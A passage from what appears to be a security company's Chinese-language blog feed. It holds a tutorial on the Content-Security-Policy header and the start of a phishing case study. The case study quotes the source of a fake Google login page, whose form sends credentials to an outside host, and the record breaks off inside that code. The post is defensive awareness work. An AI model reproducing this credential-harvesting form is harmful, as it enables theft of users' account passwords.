&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy 瀏覽器支援列表&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從列表中可看到，只要使用 Content-Security-Policy 與 X-Content-Security-Policy 就已有很高的覆蓋率，除非要支援 Safari 6，否則不用特意使用 X-WebKit-CSP。更詳細的瀏覽器支援列表可參考 &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;csp-10-主要作用&quot;&gt;CSP 1.0 主要作用&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;載入來源白名單&lt;/p&gt;

    &lt;p&gt;宣告一組受信任的白名單與資源種類（如 JavaScript, CSS, image 等等），使瀏覽器只能從此白名單中載入資源，藉此防止攻擊者從外部引入含有惡意程式碼的資源。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘self’ http://js.devco.re; style-src ‘self’ http://css.devco.re; img-src ‘self’ data:; frame-src ‘none’&lt;/p&gt;

    &lt;p&gt;效果：限定 script 資源只能從 http://js.devco.re 載入；限定 style 資源只能從 http://css.devco.re 載入；限定 img 只能從相同 domain 載入，並且支援 data scheme；限定 frame 不能從任何來源載入；除了 script、style、img、frame 之外的資源，則只能從同樣 domain 以及同樣協定的來源載入。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;禁止 inline 程式碼&lt;/p&gt;

    &lt;p&gt;一般人開發網站時為求便利，經常會在 HTML 中寫入一些 inline 程式碼，但攻擊者意圖入侵網站時也常用此手法。然而瀏覽器其實無法分辨這些 inline 程式碼究竟是開發人員寫的，還是攻擊者植入的。因此 CSP 乾脆強迫開發者必須把所有 inline 程式碼移到外部檔案，完全杜絕在 HTML 中出現 inline 程式碼的狀況。因此除非你在 CSP 宣告時有註明 ‘unsafe-inline’，否則 CSP 預設禁止使用 inline script 或 inline CSS。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘unsafe-inline’&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;禁止 eval 函式&lt;/p&gt;

    &lt;p&gt;eval() 對許多開發者來說一直是個非常方便的函式，然而若缺乏資安觀念，使用此函式時很可能會導致潛在的 XSS 風險。因此除非你在 CSP 宣告時有註明 ‘unsafe-eval’，否則 CSP 預設禁止使用 eval() 函式。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘unsafe-eval’&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;防止 sniffer&lt;/p&gt;

    &lt;p&gt;由於 CSP 可指定載入資源時強制使用 https 協定，因此可降低被 sniffing 的機率。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src http://devco.re; img-src https:&lt;/p&gt;

    &lt;p&gt;效果：限定圖片只能從 https 協定載入，不限定 domain。而除了圖片之外的資源則可從任意來源載入。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;csp-demo&quot;&gt;CSP Demo&lt;/h3&gt;

&lt;p&gt;下面這一段程式碼，使用 default-src * 讓相關資源可正常顯示：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src *&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CSP Demo Site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Content Security Policy Demo Site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://devco.re/assets/themes/devcore/images/double-sticker.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/img&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;frameborder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;300&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;200&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;http://www.youtube.com/embed/E-BGf1MwecU&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; alt=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接下來我們將 php header 的那一行程式碼修改如下並且 reload 瀏覽器頁面：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src *; img-src https:; frame-src &apos;none&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; alt=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;使用 CSP 限制 img 與 frame 的來源種類後，我們可以從上圖 Chrome Inspector 的紅字觀察到，網站的圖片與 iframe 影片已被瀏覽器擋掉，無法載入。&lt;/p&gt;

&lt;p&gt;如果擔心直接使用 CSP 會影響網站營運，但又想嘗試 CSP，可以先使用 Content-Security-Policy-Report-Only，示範如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &apos;none&apos;; report-uri http://devco.re/demo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由上圖可以看到，此 header 不會直接阻擋不符合 CSP 規範的資源，但是會根據使用者所違反的規則發送相對應的 POST request 至指定的 URI，發送內容如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;csp-report&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;blocked-uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://devco.re/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;document-uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://yoursite.com/csp.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;original-policy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default-src *; img-src https:; frame-src &apos;none&apos;; report-uri http://devco.re/demo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;referrer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status-code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;violated-directive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;img-src https:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;由發送內容可看出這個 request 因為違反了「img-src https:」規則而將「http://devco.re/」這個來源擋掉。經由此方式，可一邊修改網站一邊觀察是否仍有不符合 CSP 規範之處，等到所有違規的內容都修正完畢後，再將 CSP 套用到正式上線環境。&lt;/p&gt;

&lt;p&gt;由於宣告方式非常多種，在這邊就不一一條列，若有興趣可前往 &lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy Reference &amp;amp; Examples&lt;/a&gt;、&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;Using Content Security Policy - Security | MDN&lt;/a&gt; 等網頁，有更完整的使用情境與範例可供參考。另外也有 &lt;a href=&quot;http://benvinegar.github.io/csp-talk-2013/&quot;&gt;Slide&lt;/a&gt; (by Ben Vinegar) 跟 &lt;a href=&quot;https://www.youtube.com/watch?v=pocsv39pNXA&quot;&gt;YouTube 影片&lt;/a&gt; (by Adam Barth) 可參考。&lt;/p&gt;

&lt;h3 id=&quot;csp-實際使用案例&quot;&gt;CSP 實際使用案例&lt;/h3&gt;

&lt;p&gt;目前採用 CSP 的案例較少，比較知名的使用案例是 &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;，在 2013 年 4 月 &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub 還寫了一篇專文&lt;/a&gt;公告表示他們已開始採用 CSP。另外一個案例廠商可能較廣為人知，是在 2013 年當紅的免費儲存空間 &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;。兩個案例的實際內容可見於下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一項知名使用案例是 Google 明定&lt;a href=&quot;https://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;開發 Chrome Extension 時必須使用 CSP&lt;/a&gt;，以追求更高的安全性。Mozilla 也在 &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki 開了一頁&lt;/a&gt;存放相關技術細節。若您想觀察其他使用案例，可使用 Chrome Inspector 或 curl 觀察以下幾個網站：&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;，&lt;a href=&quot;https://twitter.com/&quot;&gt;Twitter&lt;/a&gt;，&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;csp-常見誤用案例&quot;&gt;CSP 常見誤用案例&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;directives 後面不需加冒號&lt;/p&gt;

    &lt;p&gt;錯誤：default-src: ‘self’&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directives 之間以分號區隔&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’, script-src ‘self’&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; script-src ‘self’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;多個 source 之間僅以空白區隔&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’; img-src ‘self’, img1.devco.re, img2.devco.re&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; img-src ‘self’ img1.devco.re img2.devco.re&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某些 source 必須加冒號（https:、data:）&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’; img-src ‘self’ https data&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; img-src ‘self’ https: data:&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某些 source 必須用單引號括起來（’none’、’self’、’unsafe-inline’、’unsafe-eval’）&lt;/p&gt;

    &lt;p&gt;錯誤：script-src self unsafe-inline unsafe-eval&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;使用 CSP 可以有效提升攻擊難度，讓許多常見的 XSS 攻擊失效，是一個非常推薦開發者使用的 HTTP header。但由於目前的開發者在 HTML 裡面寫 inline script 及 inline CSS 的比例非常高，同時也有一些網路服務預設都需要使用 inline script（例如 Google Analytics，相關解法可參考&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;這裡&lt;/a&gt;），因此要享受這樣的安全之前，可能需要先付出許多時間與心力將網站大幅整理，套用 CSP 規範後網頁才能正常運作。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/</link>
                <guid>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</guid>
                <pubDate>Tue, 08 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Google 帳號釣魚案例</title>
                <description>&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail 國家資助的攻擊者警告&quot; title=&quot;Gmail 國家資助的攻擊者警告&quot; /&gt;&lt;/p&gt;

&lt;p&gt;駭客間的戰爭已經不只是個人對個人，而已經擴大成國家對國家。一個國家為了獲取他國的機密文件、情報、個人資料等，都會想盡各種辦法入侵帳號、寄送惡意郵件、釣魚盜取密碼等。而身為受害者的我們能做什麼呢？Google 官方提出的建議是：加強密碼安全、注意登入 IP 位址、更新自己使用的軟體、&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;開啟二階段驗證&lt;/a&gt;。當然有良好的資安意識才是更重要的。&lt;/p&gt;

&lt;p&gt;正好今天收到一個簡單的案例，提供給各位參考。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;在信箱中躺著一封很像是國外客戶的信件「Company Profile / Order Details」。內容看起來也很正常，並且附上了公司的基本資料為附加檔案。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;釣魚信件&quot; title=&quot;釣魚信件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;點開附件，會發現畫面先跳了 JavaScript 警告視窗後，隨即導向到 Google 登入頁面。&lt;/p&gt;

&lt;p&gt;注意看，這個登入頁面是真的嗎？有沒有發現畫面上的「Stay signed in」前面的勾變成方框了？瀏覽器上的網址也是在本機的位址。想想看，怎麼可能點了附件之後，跳轉到 Google 登入畫面？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;釣魚信件附件假冒 Google 登入&quot; title=&quot;釣魚信件附件假冒 Google 登入&quot; /&gt;&lt;/p&gt;

&lt;p&gt;讓我們看一下原始碼，會發現他的 form 被改成一個奇怪的網址，看起來就是惡意網站。其餘網頁的部份都是從 Google 真實的登入頁面抓取下來修改的。因此只要一不注意，就會以為是真的 Google 登入畫面而輸入帳號密碼。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;釣魚信件原始碼&quot; title=&quot;釣魚信件原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;節錄部分 code 如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;novalidate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://cantonfair.a78.org/yahoo/post.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gaia_loginform&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GALX&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6UMbQQmFgwI&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;continue&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://mail.google.com/mail/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;service&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mail&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;scc&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sacu&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_utf8&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_utf8&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;☃&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgresponse&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgresponse&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;js_disabled&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pstMsg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pstMsg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dnConn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dnConn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
